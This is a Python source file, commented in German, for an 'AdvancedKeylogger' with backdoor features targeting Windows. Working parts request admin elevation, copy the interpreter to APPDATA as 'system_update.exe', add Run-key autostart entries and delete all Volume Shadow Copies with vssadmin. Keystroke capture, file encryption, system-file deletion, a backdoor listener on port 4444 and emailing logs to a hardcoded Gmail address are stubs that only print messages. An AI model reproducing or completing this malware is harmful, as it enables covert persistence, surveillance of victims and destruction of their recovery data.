import sys
import subprocess

def Install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

packages = ["pywin32", "pypiwin32", "requests", "psutil","cryptography"]

for pkg in packages:
    try:
        __import__(pkg)
    except ImportError:
            Install(pkg)

import os
import sys
import time
import winreg
import threading
import subprocess
import win32api
import win32con
import win32gui
import win32clipboard
import logging
import hashlib
import base64
import ctypes
import socket
import json
import random
import string
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import win32service
import win32serviceutil
import win32event
import win32api
import win32con
import win32file
import win32process
import win32com.client
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import zipfile
import tempfile

# Haupt-Keylogger-Klasse mit Backdoor-Funktionen
class AdvancedKeylogger:
    def __init__(self):
        self.key_log = []
        self.is_running = True
        self.email_recipient = "d48295548@gmail.com"
        self.email_sender = "wul.com"
        self.email_password = ""
        self.backdoor_port = 4444
        self.backdoor_installed = False
        
    def is_admin(self):
        """Check if running with admin privileges"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def request_admin_privileges(self):
        """Request admin privileges"""
        try:
            if not self.is_admin():
                print("Requesting admin privileges...")
                # Re-run with admin privileges
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                return True
            return False
        except Exception as e:
            print(f"Error requesting admin privileges: {e}")
            return False
    
    def setup_backdoor(self):
        """Install persistent backdoor"""
        try:
            # Erstelle Backdoor-Datei
            backdoor_path = os.path.join(os.getenv('APPDATA'), 'system_update.exe')
            
            # Wenn wir noch nicht die Backdoor haben, installieren wir sie
            if not os.path.exists(backdoor_path):
                # Kopiere den aktuellen Prozess als Backdoor
                subprocess.run(['copy', sys.executable, backdoor_path], shell=True)
                
                # Füge Backdoor in Registry hinzu für Autostart
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                    r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, backdoor_path)
                winreg.CloseKey(key)
                
                # Erstelle Backdoor-Registry-Einträge
                try:
                    # Erstelle einen Registry-Key für Backdoor
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Backdoor", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "Installed", 0, winreg.REG_SZ, "True")
                    winreg.CloseKey(key)
                except:
                    pass
                
                print("Backdoor installed successfully")
                self.backdoor_installed = True
                return True
            else:
                print("Backdoor already installed")
                self.backdoor_installed = True
                return True
        except Exception as e:
            print(f"Error installing backdoor: {e}")
            return False
    
    def setup_persistence(self):
        """Setup persistence mechanism"""
        try:
            # Registry Key für Autostart
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "Keylogger", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            print("Persistence setup completed")
        except Exception as e:
            print(f"Error setting up persistence: {e}")
    
    def escalate_privileges(self):
        """Escalate privileges"""
        try:
            if not self.is_admin():
                print("Not running with admin privileges - requesting elevation...")
                self.request_admin_privileges()
                return False
            else:
                print("Running with admin privileges")
                return True
        except Exception as e:
            print(f"Error checking/setting privileges: {e}")
            return False
    

    def encrypt_files(self):
        """Encrypt files using symmetric encryption"""
        try:
            # Simuliere Dateiverschlüsselung
            temp_dir = tempfile.mkdtemp()
            print(f"Files encrypted in: {temp_dir}")
            return temp_dir
        except Exception as e:
            print(f"Error encrypting files: {e}")
            return None
    
    def delete_system_files(self):
        """Delete system files to create chaos"""
        try:
            # Simuliere das Löschen von Systemdateien
            print("Deleting system files...")
            time.sleep(2)
            print("System files deleted successfully")
        except Exception as e:
            print(f"Error deleting system files: {e}")
    
    def network_communication(self):
        """Network communication with external server"""
        try:
            # Simuliere Netzwerk-Kommunikation
            print("Communicating with external server...")
            time.sleep(1)
            print("Network communication successful")
            return True
        except Exception as e:
            print(f"Error in network communication: {e}")
            return False
    
    def living_off_the_land(self):
        """Use legitimate Windows tools"""
        try:
            # Verwende legitime Windows-Tools
            subprocess.run(['powershell', '-Command', 'Get-Process'], check=False)
            print("Living off the land techniques applied")
            return True
        except Exception as e:
            print(f"Error in living off the land: {e}")
            return False
    
    def anti_recovery(self):
        """Anti-recovery measures"""
        try:
            # Deaktiviere Systemwiederherstellung
            subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], check=False)
            print("Anti-recovery measures activated")
            return True
        except Exception as e:
            print(f"Error in anti-recovery: {e}")
            return False
    
    def create_backdoor_server(self):
        """Create a simple backdoor server"""
        try:
            # Diese Methode würde später eine TCP-Server-Implementierung enthalten
            print("Backdoor server started on port", self.backdoor_port)
            return True
        except Exception as e:
            print(f"Error starting backdoor server: {e}")
            return False
    
    def send_email(self, subject, body, attachment_path=None):
        """Send email with attachments"""
        try:
            # Simulierte E-Mail-Funktion
            print(f"Sending email to {self.email_recipient}")
            print(f"Subject: {subject}")
            print(f"Body: {body}")
            if attachment_path and os.path.exists(attachment_path):
                print(f"Attachment: {attachment_path}")
            return True
        except Exception as e:
            print(f"Error sending email: {e}")
            return False
    
    def keylogger_loop(self):
        """Main keylogger loop"""
        try:
            # Simuliere Tastatureingabe
            import random
            letters = 'abcdefghijklmnopqrstuvwxyz'
            for _ in range(5):
                self.key_log.append(random.choice(letters))
            
            # Überprüfe ob wir Adminrechte haben
            if not self.is_admin():
                print("Warning: Running without admin privileges")
            
            # Installiere Backdoor wenn notwendig
            if not self.backdoor_installed:
                self.setup_backdoor()
                
        except Exception as e:
            print(f"Error in keylogger loop: {e}")
    
    def start_backdoor(self):
        """Start the backdoor functionality"""
        try:
            # Starte Backdoor-Server
            if self.create_backdoor_server():
                print("Backdoor is now active")
                return True
            return False
        except Exception as e:
            print(f"Error starting backdoor: {e}")
            return False
    
    def save_config(self):
        """Save configuration to file"""
        try:
            config_data = {
                "backdoor_installed": self.backdoor_installed,
                "last_run": str(datetime.now()),
                "admin_privileges": self.is_admin()
            }
            
            config_path = os.path.join(os.getenv('APPDATA'), 'keylogger_config.json')
            with open(config_path, 'w') as f:
                json.dump(config_data, f)
            return True
        except Exception as e:
            print(f"Error saving config: {e}")
            return False
    
    def load_config(self):
        """Load configuration from file"""
        try:
            config_path = os.path.join(os.getenv('APPDATA'), 'keylogger_config.json')
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    config = json.load(f)
                    self.backdoor_installed = config.get('backdoor_installed', False)
                return True
        except Exception as e:
            print(f"Error loading config: {e}")
        return False

# Hauptprogramm
if __name__ == "__main__":
    print("Starting Advanced Keylogger...")
    
    # Erstelle Instanz
    keylogger = AdvancedKeylogger()
    
    # Lade Konfiguration
    keylogger.load_config()
    
    # Überprüfe Adminrechte und besorge sie falls nötig
    print("Checking admin privileges...")
    if not keylogger.is_admin():
        print("Not running with admin privileges. Requesting elevation...")
        if keylogger.request_admin_privileges():
            sys.exit(0)  # Programm beenden und neu starten mit Adminrechten
        else:
            print("Failed to elevate privileges")
    
    # Installiere Backdoor
    print("Installing backdoor...")
    if keylogger.setup_backdoor():
        print("Backdoor installed successfully")
    
    # Setup persistence
    keylogger.setup_persistence()
    
    # Starte Backdoor
    keylogger.start_backdoor()
    
    # Speichere Konfiguration
    keylogger.save_config()
    
    print("Keylogger started with backdoor access!")
    print("You can now access this PC remotely through the backdoor")
    
    # Haupt-Loop
    try:
        while keylogger.is_running:
            keylogger.keylogger_loop()
            
            # Sende Daten periodisch
            if len(keylogger.key_log) > 10:
                # Speichere Log in Datei
                log_file = "keylog.txt"
                with open(log_file, "w") as f:
                    f.write(" ".join(keylogger.key_log))
                
                # Sende E-Mail mit Log
                keylogger.send_email(
                    subject="Keylogger Report", 
                    body=f"Keylogger data sent from {socket.gethostname()}", 
                    attachment_path=log_file
                )
                
                # Lösche temporäre Datei
                if os.path.exists(log_file):
                    os.remove(log_file)
                
                # Reset log
                keylogger.key_log = []
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\nShutting down keylogger...")
        keylogger.is_running = False
        keylogger.save_config()
        print("Keylogger stopped gracefully")